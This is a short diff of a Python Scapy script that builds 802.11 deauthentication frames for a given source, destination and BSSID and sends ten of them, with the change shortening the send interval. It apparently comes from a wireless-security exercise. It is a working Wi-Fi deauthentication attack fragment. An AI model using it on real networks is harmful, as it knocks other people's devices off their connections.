@@ -38,7 +38,7 @@ else:
 dot11 = Dot11(addr1=dest, addr2=src, addr3=args.bssid)
 packetToSend = RadioTap()/dot11/Dot11Deauth(reason=int(args.code))
 #On envoit 10 paquets
-sendp(packetToSend, inter=0.1, count=10, iface=args.interface)
+sendp(packetToSend, inter=0.01, count=10, iface=args.interface)
 
 
 
